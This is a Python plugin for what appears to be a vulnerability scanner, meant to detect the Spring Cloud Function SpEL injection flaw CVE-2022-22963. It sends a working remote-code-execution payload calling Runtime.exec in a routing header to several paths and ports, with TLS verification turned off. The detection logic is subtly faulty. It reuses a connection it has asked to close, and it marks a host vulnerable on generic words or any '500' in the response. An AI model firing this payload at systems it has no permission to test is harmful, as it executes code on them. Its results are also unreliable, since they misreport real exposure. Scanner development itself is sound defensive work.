"""
Plugin 1098: Spring Cloud Function SpEL Injection RCE (CVE-2022-22963)
======================================================================
Detects SpEL injection RCE in Spring Cloud Function.
Real CVE: CVE-2022-22963 (CVSS 9.8)
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class SpringCloudRceDetection(NaslPlugin):
    PLUGIN_ID = 1098
    NAME = 'Spring Cloud Function SpEL Injection RCE (CVE-2022-22963)'
    FAMILY = 'Web Servers'
    CVSS_SCORE = 9.8
    DESCRIPTION = (
        'Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported '
        'versions allow remote code execution via the '
        'spring.cloud.function.routing-expression header. A specially crafted '
        'SpEL expression injected into this header is evaluated by '
        'StandardEvaluationContext, allowing full RCE with no authentication '
        'required.'
    )
    SOLUTION = (
        'Upgrade to Spring Cloud Function 3.1.7 or 3.2.3. '
        'Apply input validation on routing headers.'
    )
    CVE = ['CVE-2022-22963']
    PORTS = [80, 443, 8080, 8443, 8888]

    SPRING_PATHS = ['/', '/api', '/function', '/cloudfunction', '/test']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                    timeout=5
                )

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                spel_payload = 'T(java.lang.Runtime).getRuntime().exec("echo test")'

                for path in self.SPRING_PATHS:
                    req = (
                        f'GET {path} HTTP/1.1\r\n'
                        f'Host: {host_header}\r\n'
                        f'User-Agent: Centra/1.0\r\n'
                        f'spring.cloud.function.routing-expression: {spel_payload}\r\n'
                        f'Connection: close\r\n\r\n'
                    )
                    writer.write(req.encode())
                    await writer.drain()

                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk:
                                break
                            response += chunk
                            if len(response) > 8192:
                                break
                    except asyncio.TimeoutError:
                        pass

                    if response:
                        status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                        body_start = response.find(b'\r\n\r\n')
                        body = response[body_start + 4:] if body_start != -1 else b''
                        body_str = body.decode('utf-8', errors='ignore')

                        spel_error_hints = [
                            'SpelEvaluationException',
                            'EL evaluation',
                            'expression',
                            'FunctionRouting',
                            'org.springframework.cloud',
                            'StandardEvaluationContext',
                            'MethodInvocationException',
                        ]
                        found_hints = [h for h in spel_error_hints if h.lower() in body_str.lower()]

                        if found_hints or b'500' in response[:100]:
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity='critical',
                                description=(
                                    f'Spring Cloud Function on port {port_to_check} reflected '
                                    f'SpEL evaluation errors — potentially vulnerable to '
                                    f'CVE-2022-22963'
                                ),
                                solution=self.SOLUTION,
                                evidence=(
                                    f'Path: {path}, Status: {status_line}, '
                                    f'SpEL hints in response: {found_hints}'
                                ),
                                references=[
                                    'https://nvd.nist.gov/vuln/detail/CVE-2022-22963',
                                    'https://www.tenable.com/plugins/nessus/158402',
                                ]
                            ))
                            break

                writer.close()
                await writer.wait_closed()

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Spring Cloud Function RCE indicators detected on checked ports'
            ))

        return results
